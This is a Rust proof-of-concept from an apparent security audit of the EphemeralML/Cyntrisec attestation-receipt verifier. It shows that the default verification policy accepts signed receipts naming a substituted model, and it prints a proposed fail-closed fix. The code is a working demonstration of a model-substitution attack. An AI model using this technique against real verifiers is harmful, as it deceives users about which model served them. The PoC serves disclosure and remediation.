//! EphemeralML / Cyntrisec dishonest-prover PoC.
//!
//! Demonstrates Finding E-1 (and the policy-layer view of model
//! switching from `../model_switching.md`):
//!
//!   `AirVerifyPolicy::default()` returns `verified = true` for any
//!   structurally-valid receipt, regardless of which `model_hash` it
//!   carries. The verifier never checks the receipt's `model_hash`
//!   against an expected value unless the caller sets
//!   `expected_model_hash: Some(...)` explicitly, and the
//!   corresponding `Skip` is not in `is_critical_check_name`.
//!
//! The PoC builds two distinct AIR v1 receipts — one for a model
//! whose hash a verifier "should" expect (`H_legit`) and one for an
//! attacker-substituted model (`H_evil`). Both are signed by the
//! same per-session Ed25519 key. We then verify each receipt
//! against:
//!
//!   - `AirVerifyPolicy::default()` (the typical caller-side
//!     mistake): both pass.
//!   - A strict policy with `expected_model_hash = Some(H_legit)`
//!     pinned: the legit receipt passes; the evil receipt is
//!     rejected.
//!
//! EphemeralML's source tree is **not** modified; we only import its
//! public crate API.

use ed25519_dalek::SigningKey;
use ephemeral_ml_common::air_receipt::{build_air_v1, AirReceiptClaims};
use ephemeral_ml_common::air_verify::{verify_air_v1_receipt, AirVerifyPolicy};
use ephemeral_ml_common::receipt_signing::{EnclaveMeasurements, ReceiptSigningKey};
use rand::rngs::OsRng;

const ISS: &str = "cyntrisec.com";
const MODEL_ID: &str = "mistral-7b-instruct-v0.3";
const POLICY_VERSION: &str = "policy-2026.02";

fn make_claims(model_hash: [u8; 32], cti: [u8; 16], iat: u64) -> AirReceiptClaims {
    AirReceiptClaims {
        iss: ISS.to_string(),
        iat,
        cti,
        eat_nonce: None,
        model_id: MODEL_ID.to_string(),
        model_version: "1.0.0".to_string(),
        model_hash,
        request_hash: [0xBB; 32],
        response_hash: [0xCC; 32],
        attestation_doc_hash: [0xDD; 32],
        enclave_measurements: EnclaveMeasurements::new(
            vec![0x01; 48],
            vec![0x02; 48],
            vec![0x03; 48],
        ),
        policy_version: POLICY_VERSION.to_string(),
        sequence_number: 1,
        execution_time_ms: 116,
        memory_peak_mb: 512,
        security_mode: "production".to_string(),
        model_hash_scheme: Some("sha256-single".to_string()),
    }
}

fn current_ts() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
}

fn summarize(
    label: &str,
    result: &ephemeral_ml_common::air_verify::AirVerifyResult,
) {
    println!("    label:                {}", label);
    println!("    verified:             {}", result.verified);
    println!(
        "    checks (pass/skip/fail): {}/{}/{}",
        result.checks.iter().filter(|c| matches!(c.status,
            ephemeral_ml_common::air_verify::AirCheckStatus::Pass)).count(),
        result.checks.iter().filter(|c| matches!(c.status,
            ephemeral_ml_common::air_verify::AirCheckStatus::Skip)).count(),
        result.checks.iter().filter(|c| matches!(c.status,
            ephemeral_ml_common::air_verify::AirCheckStatus::Fail)).count(),
    );
    // Highlight any check whose name contains "MHASH" so we can see
    // exactly what verify_air_v1_receipt decided about model_hash.
    for check in &result.checks {
        let name = check.name;
        if name.contains("MHASH") || name == "MODEL" || name == "ADHASH" {
            println!(
                "        check {:<14} -> {:?}",
                name, check.status
            );
        }
    }
}

fn main() {
    println!("================================================================");
    println!("EphemeralML / Cyntrisec dishonest-prover PoC (Finding E-1)");
    println!("================================================================");
    println!();

    // Per-session signing key. In a real enclave this is generated
    // at boot inside `WorkerAttestationUserData` and the public half
    // is bound into the Nitro NSM user_data alongside model_hash.
    // For this PoC we just create one — the verifier accepts any
    // key the caller passes in.
    let raw_signing = SigningKey::generate(&mut OsRng);
    let signing_key = ReceiptSigningKey::from_parts(
        raw_signing.clone(),
        raw_signing.verifying_key(),
    );
    let verifying_key = raw_signing.verifying_key();

    let h_legit: [u8; 32] = [0x11; 32];
    let h_evil: [u8; 32] = [0x22; 32];
    let now = current_ts();

    println!("[+] Built two AIR v1 receipts signed by the same Ed25519 key.");
    println!(
        "    legit model_hash:  {}",
        hex::encode(h_legit)
    );
    println!("    evil  model_hash:  {}", hex::encode(h_evil));
    println!();

    let legit_bytes = build_air_v1(
        &make_claims(h_legit, *b"legitlegitlegit\x00", now),
        &signing_key,
    )
    .expect("build legit receipt");
    let evil_bytes = build_air_v1(
        &make_claims(h_evil, *b"evilevilevilevil", now),
        &signing_key,
    )
    .expect("build evil receipt");
    println!("    legit receipt bytes: {}", legit_bytes.len());
    println!("    evil  receipt bytes: {}", evil_bytes.len());
    println!();

    println!("================================================================");
    println!("Scenario 1 — verify both receipts under AirVerifyPolicy::default()");
    println!("================================================================");
    let default_policy = AirVerifyPolicy::default();

    println!();
    let r1 = verify_air_v1_receipt(&legit_bytes, &verifying_key, &default_policy);
    summarize("legit (default policy)", &r1);
    println!();
    let r2 = verify_air_v1_receipt(&evil_bytes, &verifying_key, &default_policy);
    summarize("evil  (default policy)", &r2);
    println!();

    if r1.verified && r2.verified {
        println!("[+] BOTH receipts verified under default policy.");
        println!(
            "    The verifier accepted both model_hash = {}... and",
            hex::encode(&h_legit[..8])
        );
        println!(
            "    model_hash = {}... interchangeably, because",
            hex::encode(&h_evil[..8])
        );
        println!("    `expected_model_hash` was None in the default policy.");
        println!();
        println!(
            "    Concretely: {} != {} but both are 'verified'.",
            hex::encode(&h_legit[..8]),
            hex::encode(&h_evil[..8])
        );
    } else {
        println!("[!] At least one receipt did not verify under default policy.");
        println!("    legit.verified = {}", r1.verified);
        println!("    evil.verified  = {}", r2.verified);
        return;
    }

    println!();
    println!("================================================================");
    println!("Scenario 2 — pin expected_model_hash = legit; verify both");
    println!("================================================================");
    let strict_policy = AirVerifyPolicy {
        expected_model_hash: Some(h_legit),
        ..AirVerifyPolicy::default()
    };
    println!();
    let r3 = verify_air_v1_receipt(&legit_bytes, &verifying_key, &strict_policy);
    summarize("legit (strict policy)", &r3);
    println!();
    let r4 = verify_air_v1_receipt(&evil_bytes, &verifying_key, &strict_policy);
    summarize("evil  (strict policy)", &r4);
    println!();

    if r3.verified && !r4.verified {
        println!("[+] Strict policy correctly distinguishes the two:");
        println!("    legit.verified = {}", r3.verified);
        println!("    evil.verified  = {}", r4.verified);
    } else {
        println!("[!] strict policy did not behave as expected.");
        return;
    }

    println!();
    println!("================================================================");
    println!("Result");
    println!("================================================================");
    println!();
    println!("    Default policy accepts both receipts.");
    println!("    Strict policy rejects the receipt whose model_hash differs");
    println!("    from the pinned value.");
    println!();
    println!("    [+] ATTACK CONFIRMED (P17, F3 — default policy pins no model identity)");
    println!();
    println!("    The operator can deploy two enclave instances with two");
    println!("    different models (each instance's user_data honestly binds");
    println!("    its own model_hash), and a verifier using");
    println!("    AirVerifyPolicy::default() accepts both. There is no");
    println!("    cross-verifier signal that distinguishes them, even though");
    println!("    one instance is serving Mistral-7B-Instruct-v0.3 and the");
    println!("    other is serving any model of the operator's choice.");
    println!();
    println!("    Fix: promote MHASH (and MODEL, ADHASH, PLATFORM) to the");
    println!("    critical-check set, so an unset expected_* policy value");
    println!("    fails closed rather than passing via Skip.");
}
